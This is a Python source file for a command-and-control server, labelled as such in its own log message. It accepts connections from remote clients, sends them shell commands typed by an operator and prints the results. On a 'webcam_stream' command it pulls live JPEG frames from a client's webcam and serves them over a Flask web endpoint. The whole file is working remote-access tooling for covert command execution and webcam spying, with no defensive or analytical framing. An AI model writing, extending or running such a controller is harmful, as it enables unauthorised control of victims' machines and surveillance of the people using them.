import socket
import threading
import os
import base64
from flask import Flask, Response

clients = {}
webcam_data = {}

# === Flask App for Webcam Feed ===
app = Flask(__name__)

@app.route('/webcam/<client_id>')
def stream_webcam(client_id):
    def generate():
        while True:
            if client_id in webcam_data:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + webcam_data[client_id] + b'\r\n')
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# === Server Code ===
def handle_client(conn, addr):
    client_id = f"{addr[0]}:{addr[1]}"
    clients[client_id] = conn
    print(f"[+] Client {client_id} connected.")

    while True:
        try:
            cmd = input(f"{client_id}> ").strip()
            if not cmd:
                continue
            conn.send(cmd.encode())
            if cmd.startswith("webcam_stream"):
                while True:
                    length = int.from_bytes(conn.recv(4), 'big')
                    if length == 0:
                        break
                    data = b''
                    while len(data) < length:
                        data += conn.recv(length - len(data))
                    webcam_data[client_id] = data
            else:
                result = conn.recv(4096).decode(errors='ignore')
                print(result)
        except Exception as e:
            print(f"[-] Connection lost: {e}")
            break
    conn.close()
    del clients[client_id]

def start_server(host='0.0.0.0', port=9999):
    s = socket.socket()
    s.bind((host, port))
    s.listen()
    print(f"[+] C2 server listening on {host}:{port}")
    threading.Thread(target=app.run, kwargs={'port': 5000}, daemon=True).start()

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
